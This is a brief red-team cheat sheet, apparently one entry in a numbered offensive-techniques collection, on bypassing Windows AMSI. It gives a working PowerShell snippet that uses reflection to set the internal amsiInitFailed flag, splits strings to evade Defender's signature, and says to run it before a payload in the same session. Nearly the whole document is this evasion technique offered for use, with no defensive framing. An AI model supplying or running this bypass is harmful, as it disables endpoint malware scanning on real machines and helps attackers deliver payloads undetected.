# 09.01 AMSI Bypass

> Flip `amsiInitFailed` to `true` via reflection (obfuscated to dodge the string signature) so PowerShell skips AMSI scanning.

## Overview

Modern Defender hooks PowerShell via AMSI. Bypass via reflection (`amsiInitFailed=true`) — obfuscated to avoid signature.

## Steps

- **Confirm enforcement** — load script normally; if blocked, you need the bypass.
- **Obfuscate the bypass** — split strings, char arrays.
- **Run BEFORE the payload** — same session only.

## Commands

### Obfuscated reflection bypass

```powershell
$a='System.Management.Automation.A';$b='msiUtils'
$c=[Ref].Assembly.GetType("$a$b")
$f=$c.GetField('amsiInitFailed','NonPublic,Static')
$f.SetValue($null,$true)
```
